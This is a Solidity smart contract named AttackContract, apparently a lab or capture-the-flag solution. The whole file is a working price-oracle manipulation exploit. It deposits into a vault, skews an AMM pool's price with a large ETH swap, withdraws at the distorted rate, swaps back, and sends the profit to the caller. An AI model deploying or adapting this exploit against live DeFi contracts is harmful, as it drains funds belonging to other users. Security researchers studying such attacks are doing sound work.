// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AmmPool.sol";

interface IOracleVault {
    function deposit() external payable;
    function withdraw(uint256 creditAmount) external;
}

contract AttackContract {
    IOracleVault public vault;
    AmmPool public pool;

    constructor(address _vault, address _pool) {
        vault = IOracleVault(_vault);
        pool = AmmPool(_pool);
    }

    function attack() external payable {
        require(msg.value == 10 ether, "send 10 ether");

        vault.deposit{value: 1 ether}();
        pool.swapEthForToken{value: 9 ether}();
        vault.withdraw(1 ether);

        uint256 tokenAmount = pool.tokenBalances(address(this));
        pool.swapTokenForEth(tokenAmount);

        require(address(this).balance > 10.5 ether, "no profit");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
